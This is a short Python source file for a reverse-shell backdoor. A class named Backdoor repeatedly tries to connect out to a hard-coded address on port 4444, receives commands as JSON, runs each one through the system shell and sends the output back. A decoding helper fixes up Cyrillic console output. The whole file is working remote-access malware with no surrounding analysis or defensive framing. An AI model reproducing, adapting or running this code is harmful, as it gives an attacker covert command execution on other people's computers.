import socket, json, subprocess, os
import base64, threading, time, webbrowser


def UkDecode(text):
	text = text.decode("cp866")
	for i in range(len(text) - 1):
		if text[i] == "?":
			text = text[:i] + "і" + text[i+1:]
	return text


class Backdoor:

	def __init__(self, ip, port):
		self.ip = ip
		self.port = port

		self.connected = False
		self.connection = None


	def connect(self):
		while True:
			if not self.connected:
				print("try connect")
				try:
					self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					self.connection.connect((self.ip, self.port))
					self.connected = True
					print("[+] Connected")
				except:
					time.sleep(3)


	def execute_system_command(self, command):
		try:
			res = UkDecode(subprocess.check_output(command, shell = True))
			return res
		except:
			return "[-] Check your command"


	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

   
	def reliable_recive(self):
		json_data = ""
		while True:
			try:
				json_data += self.connection.recv(1024).decode()
				return json.loads(json_data)
			except: continue


	def run(self):
		while True:
			if self.connected:
				command = self.reliable_recive()
				if command == "exit":
					self.reliable_send("")
					self.connected = False

				else:
					res = self.execute_system_command(command)
					self.reliable_send(res)



if __name__ == "__main__":
	backdoor = Backdoor("192.168.0.199", 4444)

	backdoor_thread = threading.Thread(target=backdoor.connect)
	backdoor_thread.start()

	backdoor.run()
